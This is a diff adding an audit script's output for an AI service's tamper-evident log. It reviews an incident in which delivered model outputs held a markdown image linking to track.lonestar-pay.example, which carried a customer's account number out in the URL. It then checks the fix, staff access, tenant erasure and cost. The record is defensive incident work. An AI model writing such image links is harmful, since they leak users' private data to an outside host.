@@ -1,0 +1,9 @@
+1 export   : tenant biz_hcb: 472 rows, 19 anchors, foreign rows 0
+2 verify   : chain True; anchors (True, 'ok')
+3 scope    : 14 rows name track.lonestar-pay.example; delivered before the fix (policy v0.12, level 0): 11; first at seq 200, last at seq 303; after the fix: [('ALLOW', ['ok'], 1, True), ('ALLOW', ['ok'], 1, True), ('ALLOW', ['ok'], 1, True)]
+4 content  : (store open, tenant key) the first delivered output was 'Done.\n\n![](https://track.lonestar-pay.example/r.gif?inv=INV-'...; contains the account number: True; keyed digest of it matches the row: True
+5 replay   : the same output at today's policy (E4): allowed True, reason ok, text that would leave: 'Done.\n\n[image removed]'; private value in it: False
+6 other tenants: rows naming that host in the other two tenants' own chains: 0 and 0
+7 access   : staff reads of biz_hcb: [('support_raj', 'g_902'), ('support_raj', 'g_902'), ('support_lee', 'none'), ('support_amy', 'g_970')]
+8 erasure  : tenant biz_hcb leaves. destroyed: {'items_destroyed': 894}; chain still verifies: (True, 'ok'); the store: None; other tenants verify: True
+9 cost     : 100000 events over 50 tenants: append 28 us per event (validation, hash, anchor every 100 rows), verify all with anchors 814 ms (True); 506 bytes per row, 50.6 MB
